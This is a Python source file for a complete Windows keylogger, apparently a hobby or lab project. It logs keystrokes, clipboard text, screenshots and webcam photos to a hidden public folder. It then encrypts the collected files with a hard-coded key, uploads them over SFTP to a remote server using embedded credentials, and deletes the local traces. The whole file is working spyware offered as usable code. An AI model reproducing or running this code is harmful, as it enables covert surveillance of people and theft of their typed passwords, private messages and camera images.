# Libraries
import os
import time

import cv2
import pysftp
import win32clipboard
from PIL import ImageGrab
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
from browser_history import get_history
from browser_history.browsers import Firefox


keys_information = "key_log.txt"
clipboard_information = "Clipboard.txt"
camera_information = ".png"
screenshot_information = ".png"

time_iterations = 30
number_of_iterations_end = 1

myHostname = "192.168.1.16"  # change this
myUsername = "pi"  # change this
myPassword = "kali123"  # change this #should be 8 characters or more including special characters
remote_file = '/home/pi/transfer/'

i = 0  # global variable to change the name of image as we click

directory = "C:\\Users\\Public\\Libraries\\"
extend = "\\"
dir_name = "Keylogger_python"
path = os.path.join(directory, dir_name)
try:
    os.makedirs(path, exist_ok=True)
    print("Directory Created")
except OSError as error:
    pass

file_path = path + extend


# only string will be recorded
def copy_clipboard():
    with open(file_path + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data + "\n")
        except:
            f.write("Clipboard Data could not be retrieved")


# Captures Webcam using cv2 module
def capture_webcam():
    camera = cv2.VideoCapture(0, cv2.CAP_MSMF)
    time_str = time.strftime("IMG_%Y%m%d_%H%M%S")  # To save each image with the time stamp
    check, frame = camera.read()
    cv2.waitKey(0)  # waits 0 milliseconds after each keypress
    camera.release()
    cv2.imwrite(file_path + extend + time_str + camera_information, frame)


# Capture Screenshots using imgrb or pyscreenshot module
def screenshots():
    imgrb = ImageGrab.grab()
    time_str = time.strftime("SGB_%Y%m%d_%H%M%S")  # To save each image with the time stamp
    imgrb.save(file_path + extend + time_str + screenshot_information)


# Encrypting all files in a specific directory using the fernet library
def encrypt_files():
    key = "BhbZu8TldX1E7eFjhfkppHVmbu7xZaW0XKMOI-eLXU4="  # Key used to encrypt and decrypt the files
    folders = [j for j in os.listdir(file_path) if os.path.isfile(os.path.join(file_path, j))]

    for j in folders:
        x = "\\"
        z = file_path + x + j
        with open(z, 'rb') as f:
            data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(z, 'wb') as f:
                f.write(encrypted)
                print(z)
                z = file_path
    print("files in folder encrypted")


# Sftp the files to server
def sftp_files():
    with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
        print("Connection Successfully Established")
        sftp.chdir(remote_file)
        time_str = time.strftime("log_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
        sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
        print("Directory created")
        sftp.chdir(time_str)
        slash = "/"
        new_path = sftp.pwd
        sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
        sftp.close()


# Delete files from the local pc or workstation
def delete_files():
    for file_name in os.listdir(file_path):
        file = file_path + file_name
        if os.path.isfile(file):
            print('Deleting file:', file)
            os.remove(file)


# Read the log file to find any mentioned threats
def read_file():
    string1 = ['quick', 'brown', 'fox', 'jumps']  # mentioned threats
    # open text file
    file1 = open(file_path + keys_information, "r")

    for line in string1:
        if any(word in line for word in string1):
            print(line)
            print("the word was found")

        else:
            print("the word is not found")

    # closing text file
    file1.close()





number_of_iterations = 0
currentTime = time.time()
stopTime = time.time() + time_iterations

while number_of_iterations < number_of_iterations_end:  # The keylogger will run until the maximum iteration is met

    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    # writes captured key stokes to a file
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == "Key.space":  # changes any space key found to ' ' to make it readable
                    f.write(' ')
                    f.close()
                elif k == "Key.backspace":  # changes any space key found to ' ' to make it readable
                    # f.seek(0, 2)
                    # size = f.tell()
                    # f.truncate(size -1)
                    # f.close()
                    f.write('(BS)')
                elif k.find("enter") > 0:  # changes any enter key found to '\n' (new line) to make it readable
                    f.write('\n')
                    f.close()
                elif k.find("delete") > 0:
                    f.write("(DEL)")
                    f.close()
                elif k.find('up') > 0:
                    f.write("")
                    f.close()
                elif k.find('down') > 0:
                    f.write("")
                    f.close()
                elif k.find('left') > 0:
                    f.write("")
                    f.close()
                elif k.find('right') > 0:
                    f.write("")
                    f.close()
                elif k.find('shift') > 0:
                    f.write("")
                    f.close()
                elif k.find('ctrl') > 0:
                    f.write("")
                    f.close()
                elif k.find('alt') > 0:
                    f.write("")
                    f.close()
                elif k.find("Keys") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stopTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # order of the functions which will run one at a time
    if currentTime > stopTime:
        screenshots()
        copy_clipboard()
        capture_webcam()
        read_file()
        encrypt_files()
        sftp_files()
        delete_files()

        number_of_iterations += 1

        currentTime = time.time()
        stopTime = time.time() + time_iterations

cv2.destroyAllWindows()
